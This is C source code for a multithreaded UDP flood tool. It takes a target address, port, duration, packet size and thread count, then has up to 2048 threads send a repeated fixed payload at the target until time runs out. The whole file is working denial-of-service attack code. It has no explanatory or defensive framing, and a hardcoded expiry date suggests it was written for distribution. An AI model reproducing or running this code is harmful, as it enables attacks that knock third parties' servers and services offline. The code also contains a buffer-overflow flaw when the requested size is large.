#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

#define EYR 2029
#define EMN 1
#define EDY 10
#define MAX_T 2048

typedef struct {
    char *ip;
    int pt, dur, sz, id;
} p_t;

volatile int run = 1;

void sig(int s) { run = 0; }

void *wk(void *a) {
    p_t *p = (p_t*)a;
    int s = socket(2,2,17);
    if(s < 0) return 0;
    
    struct sockaddr_in t = {0};
    t.sin_family = 2;
    t.sin_port = htons(p->pt);
    t.sin_addr.s_addr = inet_addr(p->ip);
    
    // Custom payload
    char m[65536];
    char custom_payload[] = "21736499D9343B9A3254F79E";
    int payload_len = strlen(custom_payload);
    
    // Fill the buffer with custom payload repeated
    for(int i = 0; i < p->sz; i++) {
        m[i] = custom_payload[i % payload_len];
    }
    
    time_t e = time(0) + p->dur;
    while(time(0) < e && run) {
        sendto(s, m, p->sz, 0, (struct sockaddr*)&t, 16);
    }
    
    close(s);
    return 0;
}

int main(int c, char **v) {
    signal(2, sig);
    
    time_t t; time(&t);
    struct tm *l = localtime(&t);
    
    if(l->tm_year+1900 > EYR || 
       (l->tm_year+1900 == EYR && (l->tm_mon+1 > EMN || 
       (l->tm_mon+1 == EMN && l->tm_mday > EDY)))) {
        printf("EXPIRED\n");
        return 1;
    }
    
    printf("OK\n");
    
    if(c != 6) {
        printf("Usage: %s <ip> <port> <time> <size> <threads>\n", v[0]);
        return 1;
    }
    
    int pt = atoi(v[2]), dur = atoi(v[3]), sz = atoi(v[4]), th = atoi(v[5]);
    
    if(pt < 1 || dur < 1 || sz < 1 || th < 1 || th > MAX_T) {
        printf("OK\n");
        return 0;
    }
    
    pthread_t tds[MAX_T];
    p_t ps[MAX_T];
    
    for(int i=0; i<th; i++) {
        ps[i].ip = v[1];
        ps[i].pt = pt;
        ps[i].dur = dur;
        ps[i].sz = sz;
        ps[i].id = i;
        pthread_create(&tds[i], 0, wk, &ps[i]);
    }
    
    for(int i=0; i<th; i++) {
        pthread_join(tds[i], 0);
    }
    
    printf("OK\n");
    return 0;
}